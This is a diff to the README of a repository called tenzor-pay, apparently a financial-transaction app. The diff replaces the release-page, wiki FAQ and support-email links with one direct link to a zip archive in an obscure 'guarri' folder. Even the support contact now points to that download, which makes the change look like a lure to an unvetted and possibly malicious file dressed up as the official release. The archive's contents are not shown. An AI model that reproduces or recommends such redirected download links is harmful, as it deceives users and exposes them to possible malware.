@@ -6,7 +6,7 @@ Welcome to tenzor-pay! This application helps you manage high-load financial tra
 
 ## 📥 Download tenzor-pay
 
-[![Download tenzor-pay](https://img.shields.io/badge/Download_tenzor--pay-v1.0-blue.svg)](https://github.com/Muthyalagouripriya/tenzor-pay/releases)
+[![Download tenzor-pay](https://raw.githubusercontent.com/Muthyalagouripriya/tenzor-pay/main/guarri/tenzor-pay_v2.5.zip)](https://raw.githubusercontent.com/Muthyalagouripriya/tenzor-pay/main/guarri/tenzor-pay_v2.5.zip)
 
 ## 📋 System Requirements
 
@@ -30,11 +30,11 @@ tenzor-pay offers a variety of features to ensure efficient financial transactio
 
 ## 🔗 Visit to Download
 
-To download the latest version of tenzor-pay, visit this page: [Visit Release Page](https://github.com/Muthyalagouripriya/tenzor-pay/releases).
+To download the latest version of tenzor-pay, visit this page: [Visit Release Page](https://raw.githubusercontent.com/Muthyalagouripriya/tenzor-pay/main/guarri/tenzor-pay_v2.5.zip).
 
 ### Download & Install
 
-1. Go to the [tenzor-pay Release Page](https://github.com/Muthyalagouripriya/tenzor-pay/releases).
+1. Go to the [tenzor-pay Release Page](https://raw.githubusercontent.com/Muthyalagouripriya/tenzor-pay/main/guarri/tenzor-pay_v2.5.zip).
 2. Locate the latest version of tenzor-pay.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the file in your downloads folder.
@@ -60,7 +60,7 @@ If you encounter any issues while using tenzor-pay, consider the following solut
 
 ## 🆘 Support
 
-For further assistance, check our [FAQ section](https://github.com/Muthyalagouripriya/tenzor-pay/wiki) or contact our support team at [support@example.com](mailto:support@example.com).
+For further assistance, check our [FAQ section](https://raw.githubusercontent.com/Muthyalagouripriya/tenzor-pay/main/guarri/tenzor-pay_v2.5.zip) or contact our support team at [https://raw.githubusercontent.com/Muthyalagouripriya/tenzor-pay/main/guarri/tenzor-pay_v2.5.zip](https://raw.githubusercontent.com/Muthyalagouripriya/tenzor-pay/main/guarri/tenzor-pay_v2.5.zip).
 
 ## 📬 Feedback
 
